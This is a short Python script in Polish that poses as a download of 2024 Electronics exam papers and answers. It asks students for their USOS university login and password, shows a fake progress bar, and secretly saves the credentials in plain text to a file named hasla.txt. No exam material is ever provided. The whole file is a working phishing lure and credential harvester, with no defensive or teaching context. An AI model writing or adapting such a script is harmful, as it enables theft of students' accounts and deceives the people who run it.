from random import randint
from time import sleep
print("WSZYSTKIE KOLOKWIA I ODOWIEDZI ELEKTNIKA 2024")
print("Aby uzyskać dostęp zaloguj sie na usos :]")
login = input("login: ")
haslo = input("haslo: ")

print()
print("[",end="")
for i in range(randint(1,10)):
    print("#", end="")
    sleep(1)
print("]")
print("Zakończono")

with open("hasla.txt", "w") as file:
    file.write(login + " " + haslo)